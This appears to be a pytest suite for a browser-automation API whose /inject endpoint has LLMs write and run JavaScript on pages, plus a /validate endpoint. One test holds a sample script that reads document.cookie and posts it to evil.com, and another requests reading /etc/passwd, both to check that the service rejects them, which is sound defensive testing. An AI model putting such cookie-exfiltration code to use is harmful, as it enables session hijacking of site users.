"""
JavaScript Injection (LLM-Generated) Tests
"""

import pytest
import sys
import json
from pathlib import Path
from typing import Dict

# Add parent directory to path
sys.path.append(str(Path(__file__).parent.parent))

from utils.test_base import BaseAPITest, assert_valid_screenshot, assert_valid_markdown


class TestInjectEndpoint(BaseAPITest):
    """Test /v2/inject endpoint for LLM-generated JavaScript"""
    
    def test_basic_injection(self):
        """Test basic JavaScript generation from natural language"""
        
        llm_config = self.get_llm_config("anthropic")
        
        response = self.make_request("POST", "/inject", json={
            "url": self.get_test_url(),
            "request": "Get the page title and count all links",
            **llm_config
        })
        
        data = self.assert_success_response(response)
        
        # Should have generated code
        assert "generated_code" in data
        assert isinstance(data["generated_code"], str)
        assert len(data["generated_code"]) > 10
        
        # Should have execution result
        assert "result" in data
        
        # Generated code should be relevant
        code_lower = data["generated_code"].lower()
        assert "title" in code_lower or "document.title" in code_lower
        assert "link" in code_lower or "queryselector" in code_lower
    
    def test_complex_data_extraction(self):
        """Test complex data extraction request"""
        
        llm_config = self.get_llm_config("openai")
        
        response = self.make_request("POST", "/inject", json={
            "url": "https://news.ycombinator.com",
            "request": "Extract the top 5 stories with their titles, points, number of comments, and links. Return as JSON.",
            **llm_config,
            "take_screenshot": True
        })
        
        data = self.assert_success_response(response)
        
        # Should generate appropriate code
        assert "generated_code" in data
        assert "result" in data
        
        # Try to parse result as JSON
        try:
            if isinstance(data["result"], str):
                result_data = json.loads(data["result"])
            else:
                result_data = data["result"]
            
            # Should have extracted stories
            assert isinstance(result_data, (list, dict))
            
            # If it's a list of stories
            if isinstance(result_data, list) and len(result_data) > 0:
                story = result_data[0]
                # Should have expected fields
                assert any(key in str(story).lower() for key in ["title", "points", "link"])
        except:
            # Result might not be perfect JSON, but should contain data
            assert len(str(data["result"])) > 50
        
        # Should have screenshot
        assert "screenshot" in data
        assert_valid_screenshot(data["screenshot"])
    
    def test_page_modification_request(self):
        """Test page modification via natural language"""
        
        llm_config = self.get_llm_config("anthropic")
        
        response = self.make_request("POST", "/inject", json={
            "url": self.get_test_url(),
            "request": "Change the background color to light blue and make all text larger",
            **llm_config,
            "take_screenshot": True,
            "extract_markdown": True
        })
        
        data = self.assert_success_response(response)
        
        # Check generated code makes sense
        code = data["generated_code"].lower()
        assert "background" in code or "style" in code
        assert "color" in code or "blue" in code
        
        # Should have screenshot showing changes
        assert "screenshot" in data
        assert "markdown" in data
    
    def test_form_filling_request(self):
        """Test form filling via natural language"""
        
        llm_config = self.get_llm_config("openai")
        
        response = self.make_request("POST", "/inject", json={
            "url": "https://httpbin.org/forms/post",
            "request": "Fill out the form with test data: use 'John Doe' for name fields, 'test@example.com' for email, and select the first option for any dropdowns",
            **llm_config
        })
        
        data = self.assert_success_response(response)
        
        # Generated code should interact with forms
        code = data["generated_code"].lower()
        assert any(term in code for term in ["form", "input", "value", "select"])
        assert "john doe" in code.lower() or "test@example.com" in code
    
    def test_content_analysis_request(self):
        """Test content analysis via natural language"""
        
        llm_config = self.get_llm_config("anthropic")
        
        response = self.make_request("POST", "/inject", json={
            "url": "https://en.wikipedia.org/wiki/Artificial_intelligence",
            "request": "Find all section headings and create a table of contents with the heading text and their hierarchy level",
            **llm_config
        })
        
        data = self.assert_success_response(response)
        
        # Should generate code to extract headings
        code = data["generated_code"].lower()
        assert any(term in code for term in ["h1", "h2", "h3", "heading", "queryselectorall"])
        
        # Result should contain heading data
        assert "result" in data
        result_str = str(data["result"]).lower()
        assert any(term in result_str for term in ["artificial", "intelligence", "history", "applications"])
    
    def test_interaction_sequence(self):
        """Test multi-step interaction request"""
        
        llm_config = self.get_llm_config("openai")
        
        response = self.make_request("POST", "/inject", json={
            "url": "https://example.com",
            "request": "First count all the links, then remove any external links, then count again and return both counts",
            **llm_config
        })
        
        data = self.assert_success_response(response)
        
        # Generated code should have multiple steps
        code = data["generated_code"]
        assert "link" in code.lower()
        
        # Should perform the requested sequence
        result = data["result"]
        # Result should contain two different counts
        assert result is not None
    
    def test_temperature_control(self):
        """Test LLM temperature control"""
        
        llm_config = self.get_llm_config("anthropic")
        
        # Low temperature - more deterministic
        response1 = self.make_request("POST", "/inject", json={
            "url": self.get_test_url(),
            "request": "Count all images on the page",
            **llm_config,
            "options": {
                "temperature": 0.1
            }
        })
        
        # Higher temperature - more creative
        response2 = self.make_request("POST", "/inject", json={
            "url": self.get_test_url(),
            "request": "Count all images on the page",
            **llm_config,
            "options": {
                "temperature": 0.9
            }
        })
        
        # Both should succeed
        data1 = self.assert_success_response(response1)
        data2 = self.assert_success_response(response2)
        
        # Both should generate valid code
        assert "generated_code" in data1
        assert "generated_code" in data2
    
    def test_retry_on_failure(self):
        """Test retry mechanism for failed code"""
        
        llm_config = self.get_llm_config("openai")
        
        response = self.make_request("POST", "/inject", json={
            "url": self.get_test_url(),
            "request": "Extract data from a non-existent element with class .this-does-not-exist-12345",
            **llm_config,
            "options": {
                "max_attempts": 3
            }
        })
        
        # Should handle gracefully
        if response.status_code == 200:
            data = response.json()
            # Might succeed with null/empty result
            assert "generated_code" in data
        else:
            # Or might fail after retries
            assert response.status_code in [422, 500]


class TestInjectWithDifferentProviders(BaseAPITest):
    """Test injection with different LLM providers"""
    
    def test_anthropic_provider(self):
        """Test with Anthropic Claude"""
        
        if not self.anthropic_token:
            pytest.skip("Anthropic token not configured")
        
        response = self.make_request("POST", "/inject", json={
            "url": self.get_test_url(),
            "request": "Find the main heading and return its text",
            "llm_provider": "anthropic",
            "llm_token": self.anthropic_token
        })
        
        data = self.assert_success_response(response)
        assert "generated_code" in data
        assert "result" in data
    
    def test_openai_provider(self):
        """Test with OpenAI GPT"""
        
        if not self.openai_token:
            pytest.skip("OpenAI token not configured")
        
        response = self.make_request("POST", "/inject", json={
            "url": self.get_test_url(),
            "request": "Count all paragraphs on the page",
            "llm_provider": "openai",
            "llm_token": self.openai_token
        })
        
        data = self.assert_success_response(response)
        assert "generated_code" in data
        assert "result" in data
    
    def test_gemini_provider(self):
        """Test with Google Gemini"""
        
        if not self.gemini_token:
            pytest.skip("Gemini token not configured")
        
        response = self.make_request("POST", "/inject", json={
            "url": self.get_test_url(),
            "request": "List all image alt texts",
            "llm_provider": "gemini", 
            "llm_token": self.gemini_token
        })
        
        data = self.assert_success_response(response)
        assert "generated_code" in data
    
    def test_invalid_provider(self):
        """Test with invalid provider"""
        
        response = self.make_request("POST", "/inject", json={
            "url": self.get_test_url(),
            "request": "Get page title",
            "llm_provider": "invalid_provider",
            "llm_token": "fake_token"
        })
        
        assert response.status_code == 400


class TestInjectErrorHandling(BaseAPITest):
    """Test error handling for inject endpoint"""
    
    def test_missing_llm_token(self):
        """Test injection without LLM token"""
        
        response = self.make_request("POST", "/inject", json={
            "url": self.get_test_url(),
            "request": "Get page title",
            "llm_provider": "openai"
            # Missing llm_token
        })
        
        assert response.status_code == 400
    
    def test_invalid_llm_token(self):
        """Test with invalid LLM token"""
        
        response = self.make_request("POST", "/inject", json={
            "url": self.get_test_url(),
            "request": "Get page title",
            "llm_provider": "openai",
            "llm_token": "invalid_token_12345"
        })
        
        assert response.status_code in [401, 400]
        
        if response.status_code == 401:
            self.assert_error_response(response, "INVALID_LLM_TOKEN")
    
    def test_empty_request(self):
        """Test with empty request"""
        
        llm_config = self.get_llm_config("anthropic")
        
        response = self.make_request("POST", "/inject", json={
            "url": self.get_test_url(),
            "request": "",
            **llm_config
        })
        
        assert response.status_code == 400
    
    def test_ambiguous_request(self):
        """Test with ambiguous request"""
        
        llm_config = self.get_llm_config("openai")
        
        response = self.make_request("POST", "/inject", json={
            "url": self.get_test_url(),
            "request": "Do something with the things",  # Very vague
            **llm_config
        })
        
        # Should still try to generate something
        if response.status_code == 200:
            data = response.json()
            assert "generated_code" in data
            # Code might be generic but should be valid
    
    def test_impossible_request(self):
        """Test with impossible request"""
        
        llm_config = self.get_llm_config("anthropic")
        
        response = self.make_request("POST", "/inject", json={
            "url": self.get_test_url(),
            "request": "Access the user's local file system and read /etc/passwd",
            **llm_config
        })
        
        # Should either refuse or generate safe code
        if response.status_code == 200:
            data = response.json()
            code = data["generated_code"].lower()
            # Should not contain file system access
            assert "/etc/passwd" not in code
            assert "filesystem" not in code
    
    def test_rate_limiting(self):
        """Test LLM rate limiting"""
        
        llm_config = self.get_llm_config("openai")
        
        # Make multiple rapid requests
        responses = []
        for i in range(5):
            response = self.make_request("POST", "/inject", json={
                "url": self.get_test_url(),
                "request": f"Count all div elements (request {i})",
                **llm_config
            })
            responses.append(response)
        
        # Check if any hit rate limits
        rate_limited = any(r.status_code == 429 for r in responses)
        
        if rate_limited:
            # Find a rate limited response
            for r in responses:
                if r.status_code == 429:
                    self.assert_error_response(r, "LLM_RATE_LIMIT")
                    break


class TestInjectValidation(BaseAPITest):
    """Test validation endpoint for generated JavaScript"""
    
    def test_validate_generated_code(self):
        """Test validation of LLM-generated code"""
        
        # First generate some code
        llm_config = self.get_llm_config("anthropic")
        
        inject_response = self.make_request("POST", "/inject", json={
            "url": self.get_test_url(),
            "request": "Count all images and links",
            **llm_config
        })
        
        if inject_response.status_code == 200:
            inject_data = inject_response.json()
            generated_code = inject_data["generated_code"]
            
            # Now validate it
            validate_response = self.make_request("POST", "/validate", json={
                "javascript": generated_code,
                "context": {
                    "url": self.get_test_url(),
                    "purpose": "Count images and links"
                }
            })
            
            validate_data = self.assert_success_response(validate_response)
            
            # Should be valid
            assert "valid" in validate_data
            assert validate_data["valid"] is True
    
    def test_validate_malicious_code(self):
        """Test validation catches malicious code"""
        
        malicious_code = """
        // Try to steal cookies
        const cookies = document.cookie;
        fetch('https://evil.com/steal', {
            method: 'POST',
            body: cookies
        });
        """
        
        response = self.make_request("POST", "/validate", json={
            "javascript": malicious_code
        })
        
        data = response.json()
        
        # Should be invalid
        assert data["valid"] is False
        assert "errors" in data
        assert len(data["errors"]) > 0
        
        # Should identify security issues
        error_messages = str(data["errors"]).lower()
        assert "cookie" in error_messages or "security" in error_messages


if __name__ == "__main__":
    pytest.main([__file__, "-v"])